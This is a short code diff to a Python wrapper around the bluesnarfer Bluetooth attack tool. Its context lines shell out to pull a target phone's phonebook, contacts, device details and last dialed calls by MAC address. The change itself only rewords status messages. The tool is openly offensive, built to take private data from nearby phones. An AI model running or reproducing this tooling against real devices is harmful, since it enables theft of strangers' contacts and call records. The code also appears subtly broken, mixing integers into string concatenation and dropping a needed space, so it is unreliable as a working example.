@@ -48,16 +48,16 @@ def bluesnarfer(mode):
     dc = 2
 
     if "list" in mode:
-        print("Listing available information...\n\n")
+        print("Listing available information, press CTRL + C to stop process.\n\n")
         os.system("sudo bluesnarfer -b "" " + mac + " -C " + pbc + " -l")
     if "contacts" in mode:
-        print("Listing available contacts...\n\n")
+        print("Listing available contacts, press CTRL + C to stop process.\n\n")
         os.system("sudo bluesnarfer -b "" " + mac + " -C " + dc + " -r 1-100 -s ME")
     elif "info" in mode:
-        print("Showing device info...\n\n")
+        print("Showing device info, press CTRL + C to stop process.\n\n")
         os.system("bluesnarfer -i -b " + mac)
     elif "calls" in mode:
-        print("Listing last dialed calls...\n\n")
+        print("Listing last dialed calls, press CTRL + C to stop process.\n\n")
         os.system("sudo bluesnarfer -b "" " + mac + " -r 1-100 -C " + pbc + "-s DC")
     else:
         print("Invalid action.")
